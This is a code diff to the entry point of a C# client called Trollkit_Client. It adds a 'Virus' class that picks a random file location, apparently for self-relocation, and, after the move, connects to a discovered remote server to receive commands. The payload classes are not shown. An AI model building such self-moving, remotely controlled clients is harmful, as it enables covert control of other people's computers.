@@ -1,8 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Trollkit_Client.Modules;
 using Trollkit_Library;
 using Trollkit_Library.Models;
 
@@ -15,10 +18,23 @@ namespace Trollkit_Client
 
 		static void Main(string[] args)
 		{
-			var program = new Program();
-			var addresses = program.discover.GetIpAddresses();
-			string ip = program.discover.GetRemoteServerIp(addresses);
-			program.receiver.ConnectAndReceive(ip);
+			
+			if (args.Length > 0)
+				if(args[0] == "move-completed")
+				{
+					Console.WriteLine("Application has been moved to a different location...");
+					var program = new Program();
+					var addresses = program.discover.GetIpAddresses();
+					string ip = program.discover.GetRemoteServerIp(addresses);
+					program.receiver.ConnectAndReceive(ip);
+					Console.Read();
+					return;
+				}
+
+
+			Virus virus = new Virus();
+			Console.WriteLine(virus.FindRandomFileLocation());
+
 			Console.Read();
 		}
 
